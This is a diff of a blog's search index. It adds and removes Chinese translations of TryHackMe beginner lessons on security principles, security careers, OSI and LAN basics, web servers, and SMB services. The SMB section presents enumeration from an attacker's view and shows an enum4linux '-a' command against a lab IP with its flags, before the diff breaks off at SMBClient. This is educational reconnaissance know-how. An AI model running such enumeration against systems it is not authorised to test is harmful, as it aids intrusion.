+<h3 id="ISO-IEC-19249-指导的五项设计原则"><a href="#ISO-IEC-19249-指导的五项设计原则" class="headerlink" title="ISO&#x2F;IEC 19249 指导的五项设计原则"></a>ISO&#x2F;IEC 19249 指导的五项设计原则</h3><p><strong>最小特权</strong>：即“按需”或“知情”原则，仅授予完成任务所需的最低权限<br><strong>攻击面最小化</strong>：系统存在已知和未知的漏洞。通过减少攻击面，降低漏洞被利用的风险<br><strong>集中化的参数验证</strong>：参数验证确保系统状态正确，应集中在统一的库或系统中，以避免无效输入导致拒绝服务或远程代码执行等问题<br><strong>集中化的通用安全服务</strong>：安全服务应集中管理，以便统一控制安全服务，同时需防止单点故障以确保可用性<br><strong>错误和异常处理准备</strong>：系统应具备防止错误泄露机密信息的机制，做好错误和异常处理是确保安全的重要步骤<br><br></p>
+<h2 id="零信任与信任但验证"><a href="#零信任与信任但验证" class="headerlink" title="零信任与信任但验证"></a>零信任与信任但验证</h2><h3 id="信任但验证"><a href="#信任但验证" class="headerlink" title="信任但验证"></a>信任但验证</h3><p>即使信任某个实体或其行为，仍需进行验证。此实体可以是用户或系统，验证通常涉及日志记录机制，通过检查日志确保操作符合预期。但全面验证所有内容在实际中并不现实</p>
+<h3 id="零信任"><a href="#零信任" class="headerlink" title="零信任"></a>零信任</h3><p>信任本身是一种潜在漏洞，特别关注内部威胁，倡导“永不信任，始终验证”。在零信任模型中，任何实体在被验证安全前都被视为潜在威胁。与传统模型不同，零信任不因设备的网络位置或归属而赋予信任，访问任何资源前都需身份验证和授权，从而在安全漏洞发生时将风险控制在最小范围内。</p>
+<p>微分段是零信任架构的一种实现方式，通过将网络划分至单一主机级别，各分段间的通信需身份验证和访问控制检查等安全措施。</p>
+<p>虽然零信任的应用需考虑业务影响，但在可行的情况下，它是一种有效的安全策略。<br><br></p>
+<h2 id="威胁与风险"><a href="#威胁与风险" class="headerlink" title="威胁与风险"></a>威胁与风险</h2><p><strong>漏洞</strong>：漏洞指的是系统或组件中的弱点，可能被攻击者利用，导致系统受到攻击或损害<br><strong>威胁</strong>：威胁是与漏洞相关的潜在危险，即可能对系统或数据造成损害的行为或事件<br><strong>风险</strong>：风险是威胁利用漏洞的可能性，以及利用对业务的潜在影响，关注的是风险发生的可能性和后果<br><br></p>
+<!-- https://tryhackme.com/r/room/securityprinciples -->
+<!-- AI翻译✔，手工检查✔，AI优化✔，通读原文✔ -->
+<!-- 删除例子✔，删除主语✔，母语化✔，添加工具✔ -->]]></content>
+      <categories>
+        <category>网络安全基础</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Linux基础知识 第二部分</title>
     <url>/2024/10/27/T2-%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD1-2/</url>
     <content><![CDATA[<h2 id="SSH-访问-Linux"><a href="#SSH-访问-Linux" class="headerlink" title="SSH 访问 Linux"></a>SSH 访问 Linux</h2><h3 id="什么是-SSH-及其工作原理？"><a href="#什么是-SSH-及其工作原理？" class="headerlink" title="什么是 SSH 及其工作原理？"></a>什么是 SSH 及其工作原理？</h3><p>Secure Shell（SSH）是一种设备间的加密协议。通过使用加密技术，以人类可读的格式发送的任何输入会在网络传输过程中加密 —— 当到达远程机器时再进行解密，是连接和操作远程 Linux 机器命令行的常用方式</p>
@@ -386,6 +466,25 @@
 ]]></content>
       <categories>
         <category>基本技能</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>网络安全职业</title>
+    <url>/2024/10/27/T1-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%801/</url>
+    <content><![CDATA[<h2 id="安全分析师"><a href="#安全分析师" class="headerlink" title="安全分析师"></a>安全分析师</h2><p><strong>负责维护组织数据的安全性</strong></p>
+<p>安全分析师负责深入研究和评估公司网络，提取关键数据，以向技术团队提供建议，协助制定和优化防御措施。该职位需要与各利益相关者合作，以确保理解并满足安全需求，优化整体安全态势。</p>
+<h3 id="职责"><a href="#职责" class="headerlink" title="职责"></a>职责</h3><p>与利益相关者合作，全面分析公司网络安全现状<br>编写网络安全报告，记录安全事件及对应措施<br>制定并实施安全策略，跟踪新的攻击工具和趋势，确保各团队能够及时应对<br><br></p>
+<h2 id="安全工程师"><a href="#安全工程师" class="headerlink" title="安全工程师"></a>安全工程师</h2><p><strong>设计、监控和维护安全控制、网络和系统，以防止网络攻击</strong></p>
+<p>安全工程师根据安全团队提供的威胁和漏洞信息，开发并实施安全解决方案。安全工程师应对各种攻击，包括网络应用攻击、网络威胁，以及攻击趋势和策略。其目标是建立有效的安全措施，降低攻击和数据泄露的风险。</p>
+<h3 id="职责-1"><a href="#职责-1" class="headerlink" title="职责"></a>职责</h3><p>测试并筛选软件中的安全控制措施<br>监控网络安全状态，生成报告，及时更新系统并缓解漏洞<br>识别并实施必要的系统，以确保最佳安全性<br><br></p>
+<h2 id="渗透测试工程师"><a href="#渗透测试工程师" class="headerlink" title="渗透测试工程师"></a>渗透测试工程师</h2><p><strong>负责测试技术产品的安全漏洞</strong></p>
+<p>渗透测试又称“渗测”或“道德黑客”，通过模拟攻击手段测试公司系统和软件的安全性，以发现潜在的缺陷和漏洞。渗透测试工程师利用这些漏洞来评估每种情况下的风险，帮助公司制定相应的修复措施，以预防真实的网络攻击。</p>
+<h3 id="职责-2"><a href="#职责-2" class="headerlink" title="职责"></a>职责</h3><p>对计算机系统、网络和基于网络的应用程序进行渗透测试<br>执行安全评估、审计，并分析现有安全策略<br>评估和报告测试结果，提供防止攻击的改进建议<br><br></p>
+<!-- https://tryhackme.com/r/room/careersincyber -->
+<!-- AI翻译✔，手工检查✔，AI优化✔，通读原文✔ -->
+<!-- 删除例子✔，删除主语✔，母语化✔，添加工具✔ -->]]></content>
+      <categories>
+        <category>网络安全基础</category>
       </categories>
   </entry>
   <entry>
@@ -877,206 +976,6 @@
       </categories>
   </entry>
   <entry>
-    <title>OSI 模型</title>
-    <url>/2024/10/31/T2-%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD4-3/</url>
-    <content><![CDATA[<h2 id="什么是-OSI-模型？"><a href="#什么是-OSI-模型？" class="headerlink" title="什么是 OSI 模型？"></a>什么是 OSI 模型？</h2><p>开放系统互联模型（OSI）是网络中的基础模型，规定了联网设备如何发送、接收和解释数据的框架</p>
-<p>OSI 模型的优势在于即使网络中的设备功能和设计不同，只要遵循OSI标准就能够相互通信。遵循OSI模型可确保数据在不同设备之间被理解</p>
-<p>OSI 模型由七层组成，每层负责不同的任务，从第7层到第1层依次排列。数据在每一层传输时都会经过特定的处理过程，并附加相应的信息，这一过程称为“封装”。<br><br></p>
-<h2 id="第-1-层-物理层"><a href="#第-1-层-物理层" class="headerlink" title="第 1 层 - 物理层"></a>第 1 层 - 物理层</h2><p>第1层（物理层）是 OSI 模型的最底层，用于网络连接的物理硬件组件。在这一层，数据以电信号的形式传输，并以二进制（1和0）表示。这一层主要关注的是数据的物理传输方式和介质。<br><br></p>
-<h2 id="第-2-层-数据链路层"><a href="#第-2-层-数据链路层" class="headerlink" title="第 2 层 - 数据链路层"></a>第 2 层 - 数据链路层</h2><p>第2层（数据链路层）负责管理设备间的数据传输，并通过媒体访问控制（MAC）物理地址来标识网络中的设备。从网络层接收到包含远程计算机 IP 地址的数据包时，数据链路层会添加目标设备的 MAC 地址，以便在网络中找到具体的接收设备</p>
-<p>每台联网设备都有一个网络接口卡（NIC），其中包含唯一的 MAC 地址，由制造商设置到网卡上，无法更改但可通过技术手段进行伪造。当信息通过网络发送时，信息是根据 MAC 地址而非 IP 地址来定位的</p>
-<p>数据链路层还将数据组织成适合物理传输的格式，处理数据帧的错误检测和校正，确保传输的可靠性<br><br></p>
-<h2 id="第-3-层-网络层"><a href="#第-3-层-网络层" class="headerlink" title="第 3 层 - 网络层"></a>第 3 层 - 网络层</h2><p>第3层（网络层）负责路由和数据分组的管理。路由功能用于决定数据包传输的最佳路径。网络层将数据分组为小数据包进行传输，最后重组为完整的数据块</p>
-<p>网络层使用协议来选择数据到达目标设备的最佳路径，主要的协议包括开放最短路径优先协议（OSPF）和路由信息协议（RIP）。这些协议的路径选择基于以下因素：</p>
-<p>数据包经过的设备数量是否最少，路径是否最短<br>路径上是否存在数据丢失的风险，是否可靠<br>路径的物理传输速度是否更快</p>
-<p>一切都通过 IP 地址进行处理，路由器等利用 IP 地址传输数据包的设备被称为三层设备，因为它们在 OSI 模型的第三层工作<br><br></p>
-<h2 id="第-4-层-传输层"><a href="#第-4-层-传输层" class="headerlink" title="第 4 层 - 传输层"></a>第 4 层 - 传输层</h2><p>第4层（传输层）在设备之间传输数据时，传输层会选择以下两种协议之一：</p>
-<p>传输控制协议（TCP）<br>用户数据报协议（UDP）</p>
-<p>TCP的主要设计目的是确保数据传输的可靠性。它会在两个设备之间建立一个连接，并保持连接，直到所有数据成功传输完毕。TCP具有错误检查和确认机制，确保传输中的小数据块分段按顺序到达并重新组装</p>
-<table>
-<thead>
-<tr>
-<th>TCP 优点</th>
-<th>TCP 缺点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>保证数据的准确性</td>
-<td>需要设备之间建立可靠连接。如果有一小块数据未收到，则整个数据块无法使用。</td>
-</tr>
-<tr>
-<td>同步设备间的数据传输，防止设备因数据过多而过载</td>
-<td>较慢的连接会成为瓶颈，因为接收端的连接需要始终始终保持</td>
-</tr>
-<tr>
-<td>提供更多的可靠性保障</td>
-<td>由于更多的握手和确认操作，TCP 比 UDP 传输速度更慢</td>
-</tr>
-</tbody></table>
-<p>TCP 用于需要数据完整性和准确性的场景，在这些场景中丢失或不完整的数据是不接受的</p>
-<p>UDP 与 TCP 相比，不如 TCP 先进，但相对简单。UDP 不具备 TCP 的错误检查和可靠性保障。通过 UDP 发送的数据不保证一定到达接收端，也没有同步和确认机制</p>
-<table>
-<thead>
-<tr>
-<th>UDP 优点</th>
-<th>UDP 缺点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>传输速度比TCP快得多</td>
-<td>不保证数据的接收</td>
-</tr>
-<tr>
-<td>数据包发送速率由应用层控制</td>
-<td>不保留设备之间的持续连接</td>
-</tr>
-<tr>
-<td>对开发者更灵活性</td>
-<td>不稳定的连接会影响用户体验</td>
-</tr>
-</tbody></table>
-<p>UDP 适用于对可靠性要求不高的小数据传输场景。即使某些数据包丢失，整体效果影响不大，可优先考虑速度</p>
-<br>
-
-
-
-
-
-<h2 id="第-5-层-会话层"><a href="#第-5-层-会话层" class="headerlink" title="第 5 层 - 会话层"></a>第 5 层 - 会话层</h2><p>第5层（会话层）在数据经过表示层（第6层）正确转换和格式化后，负责创建并维护与目标计算机的连接。连接建立后，将创建会话，并在连接保持活跃的期间持续存在</p>
-<p>会话层还负责一段时间内未使用或连接丢失时关闭连接。并且会话可设置“检查点”，当数据丢失，仅需重新发送上次检查点以后的数据节省带宽</p>
-<p>每个会话是独立的，数据只能在当前会话中传输，无法跨会话传输。<br><br></p>
-<h2 id="第-6-层-表示层"><a href="#第-6-层-表示层" class="headerlink" title="第 6 层 - 表示层"></a>第 6 层 - 表示层</h2><p>第6层（表示层）是实施数据标准化的层级。由于软件开发人员以不同的方式开发软件，表示层需确保数据格式的一致性，使接收方能够正确解读数据</p>
-<p>表示层充当数据和应用层（第7层）之间的转换器。它将数据从一种格式转换为另一种格式，使得不同软件之间的数据显示保持一致</p>
-<p>数据加密等安全功能发生在此层</p>
-<br>
-
-
-
-
-
-<h2 id="第-7-层-应用层"><a href="#第-7-层-应用层" class="headerlink" title="第 7 层 - 应用层"></a>第 7 层 - 应用层</h2><p>第7层（应用层）是最接近用户的一层，应用层是制定协议和规则的层，用于确定用户应如何与发送或接收的数据进行交互</p>
-<p>日常应用程序提供图形用户界面（GUI），以便用户与发送或接收的数据进行交互。应用层协议也包括 DNS（域名系统），负责将网站地址转换为 IP 地址，使访问网络资源更加便捷，这层是用户直接接触的数据交互层<br><br></p>
-]]></content>
-      <categories>
-        <category>基本技能</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>整合全部内容</title>
-    <url>/2024/11/04/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD10/</url>
-    <content><![CDATA[<h2 id="整合所有内容"><a href="#整合所有内容" class="headerlink" title="整合所有内容"></a>整合所有内容</h2><p>通过之前的模块，已经了解到，当在浏览器中请求一个网页时，背后会发生很多过程。</p>
-<p>当请求一个网站时，计算机需要知道要通信的服务器的IP地址；为此，它会使用DNS。计算机会通过一组称为HTTP协议的特殊指令与网络服务器通信；网络服务器随后返回HTML、JavaScript、CSS、图像等资源，浏览器则利用这些资源来正确地格式化并显示网站。</p>
-<p>还有一些其他组件可以帮助网络更高效地运行，并提供附加功能。<br><br></p>
-<h2 id="其他组件"><a href="#其他组件" class="headerlink" title="其他组件"></a>其他组件</h2><h3 id="负载均衡器"><a href="#负载均衡器" class="headerlink" title="负载均衡器"></a>负载均衡器</h3><p>当网站流量变大，或需要高可用性的应用程序时，单个服务器可能无法满足需求。负载均衡器提供两项主要功能：确保高流量网站能够处理负载，并在某个服务器无响应时提供故障切换。</p>
-<p>当您请求一个有负载均衡器的网站时，负载均衡器会先接收请求，然后将其转发给其后方的多台服务器之一。负载均衡器使用不同的算法来选择最适合处理请求的服务器。例如，轮询算法会依次将请求分配给每个服务器；加权算法会检查每台服务器当前处理的请求数，并将请求发送到最闲的服务器。</p>
-<p>负载均衡器还会定期与每台服务器进行健康检查，以确保其正常运行。如果某台服务器未能正确响应，负载均衡器将停止向其发送流量，直到该服务器恢复正常。</p>
-<h3 id="内容分发网络（CDN）"><a href="#内容分发网络（CDN）" class="headerlink" title="内容分发网络（CDN）"></a>内容分发网络（CDN）</h3><p>CDN可以有效减少繁忙网站的流量。它允许您将网站的静态文件（如JavaScript、CSS、图片、视频等）托管在全球成千上万台服务器上。当用户请求这些文件时，CDN会选择距离用户最近的服务器进行响应，而不必让请求跨越全球。</p>
-<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>许多网站需要一种方式来存储用户数据。网络服务器可以通过数据库来存储和检索数据。数据库的形式可以从简单的纯文本文件到复杂的多服务器集群，以提供速度和稳定性。常见的数据库类型包括：MySQL、MSSQL、MongoDB、Postgres等，每种数据库都有其独特的功能。</p>
-<h3 id="网络应用防火墙（WAF）"><a href="#网络应用防火墙（WAF）" class="headerlink" title="网络应用防火墙（WAF）"></a>网络应用防火墙（WAF）</h3><p>WAF位于网络请求和服务器之间，主要目的是保护服务器免受黑客攻击或拒绝服务攻击。它会分析网络请求，以检测常见的攻击方式，并判断请求是否来自真实的浏览器而不是机器人。WAF还会通过“速率限制”来控制每秒每个IP的请求数量，以防止过量请求。如果某个请求被视为潜在攻击，WAF将丢弃该请求，不会将其发送到服务器。</p>
-<br>
-
-
-
-
-
-<h2 id="网络服务器的工作原理"><a href="#网络服务器的工作原理" class="headerlink" title="网络服务器的工作原理"></a>网络服务器的工作原理</h2><h3 id="什么是网络服务器？"><a href="#什么是网络服务器？" class="headerlink" title="什么是网络服务器？"></a>什么是网络服务器？</h3><p>网络服务器是一种监听传入连接的软件，它通过HTTP协议向客户端传送网页内容。常见的网络服务器软件包括Apache、Nginx、IIS和NodeJS。网络服务器会从“根目录”提供文件，这个根目录在软件设置中定义。例如，在Linux系统中，Nginx和Apache的默认根目录是&#x2F;var&#x2F;www&#x2F;html，而在Windows系统中，IIS的根目录是C:\inetpub\wwwroot。如果请求<a href="http://www.example.com/picture.jpg%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%9A%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%A1%AC%E7%9B%98%E7%9A%84/var/www/html/picture.jpg%E4%B8%AD%E4%BC%A0%E9%80%81%E8%AF%A5%E6%96%87%E4%BB%B6%E3%80%82">http://www.example.com/picture.jpg，服务器会从本地硬盘的/var/www/html/picture.jpg中传送该文件。</a></p>
-<h3 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h3><p>网络服务器可以通过虚拟主机托管多个不同域名的网站。服务器软件会检查HTTP头中的主机名，并与其虚拟主机配置进行匹配（虚拟主机是基于文本的配置文件）。如果找到匹配的主机名，则提供对应的网站；如果没有匹配，则提供默认网站。</p>
-<p>虚拟主机可以将根目录映射到硬盘上的不同位置。例如，one.com映射到&#x2F;var&#x2F;www&#x2F;website_one，而two.com映射到&#x2F;var&#x2F;www&#x2F;website_two。</p>
-<p>理论上，网络服务器可以托管的不同网站数量没有限制。</p>
-<h3 id="静态内容与动态内容"><a href="#静态内容与动态内容" class="headerlink" title="静态内容与动态内容"></a>静态内容与动态内容</h3><p>静态内容是指永远不变的内容，常见的例子包括图片、JavaScript、CSS等，也可能包含永不改变的HTML文件。这些文件会直接从服务器传递，未经修改。</p>
-<p>动态内容是指根据不同请求而变化的内容。比如，博客的主页会显示最新的文章条目；如果有新文章发布，主页将更新为最新条目。搜索页面也会根据搜索词显示不同结果。</p>
-<p>这些动态变化由后台通过编程和脚本语言实现。称为“后台”（Backend）处理，是因为所有操作都在幕后完成。用户看不到后台的处理代码，只能看到最终呈现的HTML结果。用户在浏览器中看到的内容称为“前端”（Frontend）。</p>
-<h3 id="脚本语言和后台语言"><a href="#脚本语言和后台语言" class="headerlink" title="脚本语言和后台语言"></a>脚本语言和后台语言</h3><p>后台语言的功能几乎没有限制，能够使网站具备交互功能。常见的后台语言（无特定顺序）包括PHP、Python、Ruby、NodeJS和Perl等。这些语言可以与数据库交互，调用外部服务，处理用户数据等等。以下是一个简单的PHP示例：</p>
-<p>假设您请求网址<a href="http://example.com/index.php?name=adam">http://example.com/index.php?name=adam</a></p>
-<p>如果index.php文件内容如下：</p>
-<p>php</p>
-<html><body>Hello <?php echo $_GET["name"]; ?></body></html>
-那么服务器返回给客户端的内容是：
-
-<p>html</p>
-<html><body>Hello adam</body></html>
-
-<p>客户端看不到任何PHP代码，因为这些代码在后台执行。这种交互性为未安全开发的网络应用程序带来了许多安全问题，您将在后续模块中了解这些问题。<br><br></p>
-]]></content>
-      <categories>
-        <category>基础技能</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>局域网简介</title>
-    <url>/2024/10/30/T2-%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD4-2/</url>
-    <content><![CDATA[<h2 id="局域网（LAN）拓扑结构介绍"><a href="#局域网（LAN）拓扑结构介绍" class="headerlink" title="局域网（LAN）拓扑结构介绍"></a>局域网（LAN）拓扑结构介绍</h2><p><strong>拓扑</strong>指网络的设计或布局，描述网络中各设备如何相互连接和组织</p>
-<h3 id="星型拓扑"><a href="#星型拓扑" class="headerlink" title="星型拓扑"></a>星型拓扑</h3><p>星型拓扑的核心概念是每个网络设备都独立地连接到一个中央网络设备上。由于所有设备的通信都需要通过中央设备，这种拓扑具备良好的可靠性和扩展性，但也需要更多的布线和专用网络设备，成本比其他拓扑结构更高</p>
-<p>尽管星型拓扑的可靠性相对较高，但中央设备仍然存在故障风险</p>
-<h3 id="总线型拓扑"><a href="#总线型拓扑" class="headerlink" title="总线型拓扑"></a>总线型拓扑</h3><p>总线型拓扑依赖于一根称为主干电缆的连接，各设备通过分支连接到这条主干电缆上。由于所有设备共享同一条通信路径，若多个设备同时请求数据，会导致网络速度下降和瓶颈问题。这种单一数据路径会导致故障排查非常困难，很难确定哪个设备出现了问题</p>
-<p>总线型拓扑具有成本优势，结构简单且经济。但缺乏冗余来应对故障，缺点是因为主干电缆上有一个单点故障，一旦电缆损坏，所有设备都无法通信</p>
-<h3 id="环形拓扑"><a href="#环形拓扑" class="headerlink" title="环形拓扑"></a>环形拓扑</h3><p>环形拓扑&#x2F;令牌拓扑是一种闭环结构，所有设备直接连接成一个环，所需布线较少，不依赖中央设备或专用硬件。在环形拓扑中，数据沿着环路依次传输，直到到达目标设备。每台设备在没有数据要发送时会转发接收到的数据，如果有数据要发送，则优先发送自己的数据，再转发其他设备的数据。</p>
-<p>这种结构只能单向传输，因此故障排查相对容易。数据需要经过多个设备才能到达目标设备，传输效率较低。</p>
-<p>环形拓扑不容易出现网络瓶颈，因为不会同时传输大量数据。其设计意味着任何设备或连接出现故障都会中断整个环路，使网络中断</p>
-<h3 id="什么是交换机（Switch）？"><a href="#什么是交换机（Switch）？" class="headerlink" title="什么是交换机（Switch）？"></a>什么是交换机（Switch）？</h3><p>交换机是用于网络中的专用设备，通过以太网端口聚合多个设备，常用于需要连接大量设备的大型网络。交换机有多种规格，通常提供4、8、16、24、32或64个端口，以便于连接多个设备</p>
-<p>与集线器相比，交换机更高效，它能记录每个设备连接的端口。当接收到数据包时，交换机会将数据包直接发送到目标设备的端口，而非广播到所有端口，有效减少网络流量</p>
-<p>交换机和路由器可以互相连接，这种连接增加了网络的冗余性，因为为数据提供了多条传输路径。一旦某条路径故障，流量可转向备用路径，减少网络停机风险，但会带来些许性能损耗。</p>
-<h3 id="什么是路由器？"><a href="#什么是路由器？" class="headerlink" title="什么是路由器？"></a>什么是路由器？</h3><p>路由器的任务是连接不同的网络并在它们之间传输数据。它通过路由技术选择最佳路径，以便数据能有效地在网络间传输</p>
-<p>路由是指数据在网络间传输的路径选择过程。当存在多条连接路径时，它确保数据沿最佳路径传送，提高传输效率和网络可靠性</p>
-<br>
-
-
-
-
-
-<h2 id="子网划分基础知识"><a href="#子网划分基础知识" class="headerlink" title="子网划分基础知识"></a>子网划分基础知识</h2><p>网络的规模从小型到大型不等。子网划分（Subnetting）是将一个网络分成多个更小的子网络的过程，网络管理员通过子网划分来将网络的特定部分分配给不同部门，以便更好地管理和分类。</p>
-<p>子网划分通过限制主机数量来实现，划分的数量由“子网掩码”决定。IP 地址和子网掩码由 . 区分包含4个字节或部分，每个字节或部分为 8 bit，总共 32 bit，每个部分的取值范围是0到255。</p>
-<p>子网通过以下三种方式使用 IP 地址：</p>
-<p>标识网络地址<br>标识主机地址<br>标识默认网关</p>
-<p>将这三种用途分开理解，并通过下表来进行说明：</p>
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>目的</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>网络地址</td>
-<td>标识网络的起始位置，标识网络的存在</td>
-<td>IP 地址为 192.168.1.100 的设备将位于 192.168.1.0 标识的网络上</td>
-</tr>
-<tr>
-<td>主机地址</td>
-<td>用于标识子网中的设备</td>
-<td>192.168.1.0网络中的设备可以被分配IP地址192.168.1.80</td>
-</tr>
-<tr>
-<td>默认网关</td>
-<td>网络中设备的特殊地址，用于将信息发送到其他网络</td>
-<td>需要发送到不同网络的数据会被转发至默认网关。网关地址通常使用网络中的第一个或最后一个主机地址192.168.1.1或192.168.1.254</td>
-</tr>
-</tbody></table>
-<p>在小型网络中常只使用一个子网，因为连接的设备数量不会超过254个 IP 地址</p>
-<p>子网划分提供好处：</p>
-<p>提高效率<br>提升安全性<br>实现控制性</p>
-<br>
-
-
-
-
-
-<h2 id="地址解析协议（ARP）"><a href="#地址解析协议（ARP）" class="headerlink" title="地址解析协议（ARP）"></a>地址解析协议（ARP）</h2><p>每个网络设备都有两个标识符：MAC地址和IP地址。地址解析协议（Address Resolution Protocol，ARP）用于将设备的IP地址与其MAC地址关联的协议，以在网络中识别和定位设备</p>
-<p>当设备需要与另一设备通信时，会使用ARP协议通过广播方式，询问目标IP地址的MAC地址。目标设备接收到请求后，将其MAC地址发送回请求设备。设备会将此IP地址与MAC地址的关联信息记录在其ARP缓存中，避免以后通信需要重复广播</p>
-<h3 id="ARP如何工作？"><a href="#ARP如何工作？" class="headerlink" title="ARP如何工作？"></a>ARP如何工作？</h3><p>每个设备都有一个用于存储信息的缓存，该缓存用于存储其他网络设备的IP地址和MAC地址的关联信息</p>
-<p>为了建立IP地址与MAC地址的关联，ARP协议发送两种类型的消息：</p>
-<p>ARP请求：设备会向网络广播一条请求，询问拥有这个 IP 地址的 MAC 地址是什么<br>ARP回复：只有拥有该IP地址的设备会回应，发送包含其MAC地址的ARP回复。发送请求的设备随后会将这个IP-MAC地址映射记录在ARP缓存中将来使用</p>
-<p>这种机制使得设备能够快速查找和联系目标设备，而无需重复广播查询<br><br></p>
-<h2 id="动态主机配置协议（DHCP）"><a href="#动态主机配置协议（DHCP）" class="headerlink" title="动态主机配置协议（DHCP）"></a>动态主机配置协议（DHCP）</h2><p>IP 地址可通过手动分配或动态主机配置协议（DHCP）服务器自动分配。当设备连接到网络时，如果没手动分配IP地址，它会发送 DHCP 发现（DHCP Discover）请求，询问网络上是否有可用的DHCP服务器。</p>
-<p>DHCP服务器接收到该请求后，会回复DHCP提供（DHCP Offer）消息，提供可用的IP地址。设备随后发送DHCP请求（DHCP Request）消息，表示它希望使用这个IP地址。最后，DHCP服务器发送DHCP确认（DHCP ACK）消息，设备便可以使用该IP地址来进行通信</p>
-<p>这四个步骤（Discover、Offer、Request、ACK）完成后，设备即可使用分配到的IP地址，无需手动配置<br><br></p>
-]]></content>
-      <categories>
-        <category>基本技能</category>
-      </categories>
-  </entry>
-  <entry>
     <title>数据包与帧</title>
     <url>/2024/10/31/T2-%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD4-4/</url>
     <content><![CDATA[<h2 id="什么是数据包和帧"><a href="#什么是数据包和帧" class="headerlink" title="什么是数据包和帧"></a>什么是数据包和帧</h2><p>数据包和帧都是数据的较小单元，它们组合在形成完整的信息或消息。在 OSI 模型中，数据包和帧有不同的定义：帧位于第2层（数据链路层），不包含IP地址等网络层信息</p>
@@ -1350,6 +1249,144 @@
       </categories>
   </entry>
   <entry>
+    <title>网络服务</title>
+    <url>/2024/11/02/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD5/</url>
+    <content><![CDATA[<h2 id="服务器消息块协议（SMB）"><a href="#服务器消息块协议（SMB）" class="headerlink" title="服务器消息块协议（SMB）"></a>服务器消息块协议（SMB）</h2><p>服务器消息块协议 (SMB) 是用于在客户端和服务器之间共享文件、打印机、端口以及其他资源访问的通信协议。通过 SMB 协议，服务器可通过网络向客户端提供文件系统和资源的访问权限，客户端则可以访问服务器上的共享文件和打印机。</p>
+<p>SMB 是一种请求-响应协议，通过在客户端和服务器之间交换消息来建立连接。客户端常通过 TCP&#x2F;IP 协议与服务器连接</p>
+<h3 id="SMB-是如何工作的？"><a href="#SMB-是如何工作的？" class="headerlink" title="SMB 是如何工作的？"></a>SMB 是如何工作的？</h3><p>建立连接后，客户端通过发送 SMB 命令来访问服务器上的共享资源，执行文件的打开、读写等操作，所有这些文件系统操作都通过网络完成。</p>
+<h3 id="什么系统支持-SMB？"><a href="#什么系统支持-SMB？" class="headerlink" title="什么系统支持 SMB？"></a>什么系统支持 SMB？</h3><p>自 Windows 95 起，Microsoft Windows 操作系统就内置了 SMB 协议的客户端和服务器支持。对于 Unix 系统，Samba 是一个支持 SMB 协议的开源服务器，用于在 Unix 和 Windows 系统之间共享文件和资源。<br><br></p>
+<h2 id="SMB-枚举"><a href="#SMB-枚举" class="headerlink" title="SMB 枚举"></a>SMB 枚举</h2><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>枚举是指收集目标系统信息的过程种发现潜在的攻击面，从而有效地进行漏洞利用。攻击者可以收集诸如用户名、密码、网络信息、主机名、应用程序数据、服务等关键信息，避免在无效漏洞利用上浪费时间和资源。</p>
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>服务器通常提供可连接的 SMB 共享驱动器，用户可以通过这些共享访问或传输文件。SMB 常是攻击者获取敏感信息的首要入口</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>枚举的第一步通常是端口扫描，以识别目标机器上开放的端口和运行的服务。帮助收集关于服务、应用程序、网络结构和操作系统的信息。</p>
+<h3 id="Enum4Linux"><a href="#Enum4Linux" class="headerlink" title="Enum4Linux"></a>Enum4Linux</h3><p>Enum4Linux 是一个用于在 SMB 协议上枚举 Windows 和 Linux 系统共享资源的工具。它整合了 Samba 工具包中的功能，能快速提取 SMB 相关信息</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -a 10.10.118.119</span><br><span class="line"><span class="comment"># enum4linux [选项] [目标 IP]</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>标签</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-U</td>
+<td>获取用户列表</td>
+</tr>
+<tr>
+<td>-M</td>
+<td>获取机器列表</td>
+</tr>
+<tr>
+<td>-N</td>
+<td>获取名称列表（不同于 -U 和 -M）</td>
+</tr>
+<tr>
+<td>-S</td>
+<td>获取共享列表</td>
+</tr>
+<tr>
+<td>-P</td>
+<td>获取密码策略信息</td>
+</tr>
+<tr>
+<td>-G</td>
+<td>获取组和成员列表</td>
+</tr>
+<tr>
+<td>-a</td>
+<td>启用上述所有选项（枚举所有）</td>
+</tr>
+</tbody></table>
+<br>
+
+
+
+
+
+<h2 id="SMB-利用"><a href="#SMB-利用" class="headerlink" title="SMB 利用"></a>SMB 利用</h2><h3 id="SMB-漏洞类型"><a href="#SMB-漏洞类型" class="headerlink" title="SMB 漏洞类型"></a>SMB 漏洞类型</h3><p>通过系统配置错误进入系统是常见的安全漏洞，这种错误配置可能允许攻击者获取系统控制所需的信息。</p>
+<p>常见的 SMB 信息：<br>SMB 共享的位置<br>SMB 共享名称<br>SMBClient 使用</p>
+<p>SMBClient 是 Samba 套件中的工具，用于访问 SMB 共享。可使用 SMBClient 访问通过 SMB 枚举发现的共享文件夹</p>
